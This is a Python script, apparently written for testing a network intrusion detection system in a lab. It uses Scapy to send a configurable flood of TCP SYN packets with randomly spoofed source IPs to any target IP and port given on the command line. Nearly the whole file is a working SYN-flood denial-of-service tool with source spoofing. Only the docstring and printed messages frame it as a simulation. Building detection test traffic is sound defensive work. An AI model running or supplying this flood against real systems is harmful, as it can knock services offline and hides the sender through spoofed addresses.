#!/usr/bin/env python
"""
DDoS Simulation - Multi-Source Attack
Sends SYN packets from spoofed (random) source IPs
Should be detected as 'DDoS' by your NIDS
"""

import sys
import time
from scapy.all import IP, TCP, send, RandShort, RandIP
import random

def ddos_simulation(target_ip, target_port=80, duration=30, packet_count=1000):
    """
    DDoS simulation - sends SYN packets from random source IPs
    Creates appearance of attack from multiple machines
    
    Args:
        target_ip: Target IP address
        target_port: Target port (default 80)
        duration: How long to run (seconds)
        packet_count: How many packets to send
    """
    print(f"\n{'='*60}")
    print(f"DDoS Simulation - Multi-Source Attack")
    print(f"{'='*60}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Packet count: {packet_count}")
    print(f"\n[!] Starting DDoS simulation...(Your NIDS should show 'DDoS')")
    print(f"[!] Spoofing random source IPs to simulate multiple attackers")
    print(f"{'='*60}\n")
    
    start_time = time.time()
    sent_count = 0
    unique_sources = set()
    
    try:
        for i in range(packet_count):
            if time.time() - start_time > duration:
                break
            
            # Generate random source IP (spoofed)
            random_src = RandIP()
            unique_sources.add(random_src)
            
            # Create TCP SYN packet from random source
            pkt = IP(src=random_src, dst=target_ip) / TCP(
                dport=target_port, 
                flags="S", 
                sport=RandShort()
            )
            
            # Send silently
            send(pkt, verbose=0)
            sent_count += 1
            
            if (i + 1) % 100 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed
                print(f"[+] Sent {sent_count} packets ({rate:.0f} pps) from {len(unique_sources)} unique sources...")
    
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[✓] DDoS Simulation complete!")
        print(f"    Total packets sent: {sent_count}")
        print(f"    Unique source IPs: {len(unique_sources)}")
        print(f"    Time elapsed: {elapsed:.2f}s")
        print(f"    Average rate: {sent_count/elapsed:.0f} pps")
        print(f"{'='*60}\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 2_ddos_simulation.py <TARGET_IP>")
        print("Example: python 2_ddos_simulation.py 192.168.56.101")
        print("\nOptions:")
        print("  python 2_ddos_simulation.py <IP> --port <PORT>")
        print("  python 2_ddos_simulation.py <IP> --duration <SECONDS>")
        print("  python 2_ddos_simulation.py <IP> --count <PACKETS>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    port = 80
    duration = 30
    count = 1000
    
    # Parse optional arguments
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--duration" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--count" and i + 1 < len(sys.argv):
            count = int(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    ddos_simulation(target_ip, port, duration, count)
